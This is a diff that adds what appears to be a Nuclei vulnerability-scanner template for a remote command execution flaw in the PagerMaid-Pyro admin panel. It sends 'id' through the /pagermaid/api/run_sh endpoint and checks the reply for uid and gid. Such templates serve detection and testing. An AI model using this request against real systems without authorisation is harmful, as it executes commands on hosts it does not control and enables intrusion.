@@ -1,0 +1,25 @@
+id: PagerMaid-Pyro-run_sh-RCE
+
+info:
+  name: PagerMaid-Pyro后台管理系统 run_sh 远程命令执行漏洞
+  author: xxx
+  severity: high
+  tags: RCE
+
+http:
+  - raw:
+      - |
+        GET /pagermaid/api/run_sh?cmd=id HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:136.0) Gecko/20100101 Firefox/136.0
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'uid='
+          - 'gid='
+        condition: and
+      - type: status
+        status: 
+          - 200
